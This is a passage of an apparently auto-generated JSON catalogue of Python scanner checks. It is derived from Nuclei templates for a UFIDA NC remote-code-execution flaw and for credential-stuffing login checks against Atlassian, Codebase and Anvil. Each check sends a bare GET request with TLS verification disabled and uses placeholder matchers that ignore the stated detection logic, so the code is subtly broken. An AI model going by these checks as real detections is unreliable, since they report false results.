checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CNVD-C-2023-76801\nName: UFIDA NC uapjs - Remote Code Execution\nSeverity: critical\nDescription: There is an arbitrary method calling vulnerability in UFIDA NC and NCC systems. By exploiting the vulnerability through uapjs (jsinvoke), dangerous methods can be called to cause attacks.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CNVD_C_2023_76801:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CNVD-C-2023-76801\"\n    SEVERITY = \"critical\"\n    NAME = \"UFIDA NC uapjs - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: len(body)==0; status_code == 200 / [OR] DSL: contains_all(body,\"Windows\", \"<?xml\", \"DNS\"); status_code == 200 || status_code == 404'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UFIDA NC uapjs - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CNVD_C_2023_76801(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cnvd",
          "cnvd2023",
          "yonyou",
          "rce",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_atechmedia_codebase_login_check",
        "name": "Atechmedia/Codebase Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid Atechmedia/Codebase account.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Set-Cookie: user_session' | status HTTP [302]",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: atechmedia-codebase-login-check\nName: Atechmedia/Codebase Login Check\nSeverity: critical\nDescription: Checks for a valid Atechmedia/Codebase account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_atechmedia_codebase_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"atechmedia-codebase-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Atechmedia/Codebase Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Set-Cookie: user_session' | status HTTP [302]\"\n\n        # Simple word matcher simulation\n        matchers = ['Set-Cookie: user_session']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Atechmedia/Codebase Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_atechmedia_codebase_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: atechmedia-codebase-login-check\nName: Atechmedia/Codebase Login Check\nSeverity: critical\nDescription: Checks for a valid Atechmedia/Codebase account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_atechmedia_codebase_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"atechmedia-codebase-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Atechmedia/Codebase Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Set-Cookie: user_session' | status HTTP [302]\"\n\n        # Simple word matcher simulation\n        matchers = ['Set-Cookie: user_session']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Atechmedia/Codebase Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_atechmedia_codebase_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cloud",
          "creds-stuffing",
          "login-check",
          "atechmedia",
          "codebase",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_atlassian_login_check",
        "name": "Atlassian Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid atlassian account.",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"error_description\":\"Wrong email or password.\"' | status HTTP [403]",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: atlassian-login-check\nName: Atlassian Login Check\nSeverity: critical\nDescription: Checks for a valid atlassian account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_atlassian_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"atlassian-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Atlassian Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"error_description\":\"Wrong email or password.\"\\' | status HTTP [403]'\n\n        # Simple word matcher simulation\n        matchers = ['\"error_description\":\"Wrong email or password.\"']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Atlassian Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_atlassian_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: atlassian-login-check\nName: Atlassian Login Check\nSeverity: critical\nDescription: Checks for a valid atlassian account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_atlassian_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"atlassian-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Atlassian Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"error_description\":\"Wrong email or password.\"\\' | status HTTP [403]'\n\n        # Simple word matcher simulation\n        matchers = ['\"error_description\":\"Wrong email or password.\"']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Atlassian Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_atlassian_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cloud",
          "creds-stuffing",
          "login-check",
          "atlassian",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_avnil_pdf_generator_check",
        "name": "useanvil.com Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid avnil pdf generator account.",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"email\":\", \"eid\":\"' | status HTTP [200]",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: avnil-pdf-generator-check\nName: useanvil.com Login Check\nSeverity: critical\nDescription: Checks for a valid avnil pdf generator account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_avnil_pdf_generator_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"avnil-pdf-generator-check\"\n    SEVERITY = \"critical\"\n    NAME = \"useanvil.com Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = 